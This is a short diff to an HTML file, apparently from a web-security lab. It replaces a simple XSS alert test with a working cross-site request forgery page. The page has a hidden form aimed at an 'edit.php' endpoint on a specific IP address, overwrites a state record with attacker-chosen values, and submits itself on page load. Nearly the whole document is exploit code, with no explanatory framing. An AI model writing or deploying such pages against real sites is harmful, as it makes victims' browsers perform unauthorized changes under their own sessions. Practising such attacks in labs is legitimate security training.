@@ -1,6 +1,13 @@
 <html>
-<body>
-:)
-<SCRIPT>alert('XSS')</SCRIPT>
-</body>
+    <body>
+        <form action="https://35.184.88.145/red/public/staff/states/edit.php?id=1" method="POST">
+            <input type="hidden" name="name" value="Alabama but better" />
+            <input type="hidden" name="code" value="ABC123" />
+            <input type="hidden" name="country_id" value="1" />
+            <input type="hidden" name="submit" value="Update" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
